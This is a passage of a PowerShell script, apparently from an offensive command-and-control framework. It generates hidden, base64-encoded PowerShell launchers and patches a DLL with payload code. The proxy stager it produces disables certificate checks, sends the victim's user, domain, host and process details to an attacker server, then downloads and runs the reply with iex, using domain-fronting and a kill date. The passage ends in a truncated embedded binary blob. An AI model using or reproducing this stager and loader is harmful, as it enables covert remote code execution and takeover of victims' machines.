        $payloadraw = 'powershell -exec bypass -windowstyle hidden -Noninteractive -e '+[Convert]::ToBase64String($bytes)
        $payload = $payloadraw -replace "`n", ""
        [IO.File]::WriteAllLines("$FolderPath\payloads\payload.bat", $payload)

        Write-Host -Object "Payload written to: $FolderPath\payloads\payload.bat"  -ForegroundColor Green
    }
    
    function PatchDll {
        param($dllBytes, $replaceString, $Arch)

        if ($Arch -eq 'x86') {
            $dllOffset = 0x00012D80
            #$dllOffset = $dllOffset +8
        }
        if ($Arch -eq 'x64') {
            $dllOffset = 0x00016F00
        }

        # Patch DLL - replace 5000 A's
        $AAAA = "A"*5000
        $AAAABytes = ([System.Text.Encoding]::UNICODE).GetBytes($AAAA)
        $replaceStringBytes = ([System.Text.Encoding]::UNICODE).GetBytes($replaceString)
    
        # Length of replacement code
        $dllLength = $replaceString.Length
        $patchLength = 5000 -$dllLength
        $nullString = 0x00*$patchLength
        $nullBytes = ([System.Text.Encoding]::UNICODE).GetBytes($nullString)
        $nullBytes = $nullBytes[1..$patchLength]
        $replaceNewStringBytes = ($replaceStringBytes+$nullBytes)

        $dllLength = 10000 -3
        $i=0
        # Loop through each byte from start position
        $dllOffset..($dllOffset + $dllLength) | % {
            $dllBytes[$_] = $replaceNewStringBytes[$i]
            $i++
        }
    
        # Return Patched DLL
        return $DllBytes
    }

    # create proxypayloads
    function CreateProxyPayload 
    {
        param
        (
            [Object]
            $username,
            [Object]
            $password,
            [Object]
            $proxyurl
        )
        $command = '[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
function Get-Webclient ($Cookie)
{
$d = (Get-Date -Format "dd/MM/yyyy");
$d = [datetime]::ParseExact($d,"dd/MM/yyyy",$null);
$k = [datetime]::ParseExact("'+$killdatefm+'","dd/MM/yyyy",$null);
if ($k -lt $d) {exit} 
$username = "'+$username+'"
$password = "'+$password+'"
$proxyurl = "'+$proxyurl+'"
$wc = New-Object System.Net.WebClient;  
$h="'+$domainfrontheader+'"
if ($h) {$wc.Headers.Add("Host",$h)}
$wc.Headers.Add("User-Agent","Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)")
if ($proxyurl) {
$wp = New-Object System.Net.WebProxy($proxyurl,$true); 
if ($username -and $password) {
$PSS = ConvertTo-SecureString $password -AsPlainText -Force; 
$getcreds = new-object system.management.automation.PSCredential $username,$PSS; 
$wp.Credentials = $getcreds;
} else {
$wc.UseDefaultCredentials = $true; 
}
$wc.Proxy = $wp;
}
if ($cookie) {
$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie")
}
$wc
} 
function primer
{
if ($env:username -eq $env:computername+"$"){$u="NT AUTHORITY\SYSTEM"}else{$u=$env:username}
$pretext = [System.Text.Encoding]::Unicode.GetBytes("$env:userdomain\$u;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid")
$pretext64 = [Convert]::ToBase64String($pretext)
$primer = (Get-Webclient -Cookie $pretext64).downloadstring("'+$ipv4address+":"+$serverport+'/connect")
$primer = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($primer))
$primer
} 
$primer = primer
if ($primer) {$primer| iex} else {
start-sleep 10
primer | iex
}'
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
    $payloadraw = 'powershell -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
    $payload = $payloadraw -replace "`n", ""
    [IO.File]::WriteAllLines("$FolderPath\payloads\proxypayload.bat", $payload)
    [IO.File]::WriteAllLines("$PoshPath\Modules\proxypayload.ps1", "`$proxypayload = '$payload'")
    Write-Host -Object "Payload written to: $FolderPath\payloads\proxypayload.bat"  -ForegroundColor Green
    Write-Host -Object "Payload written to: $PoshPath\Modules\proxypayload.ps1"  -ForegroundColor Green

    $86="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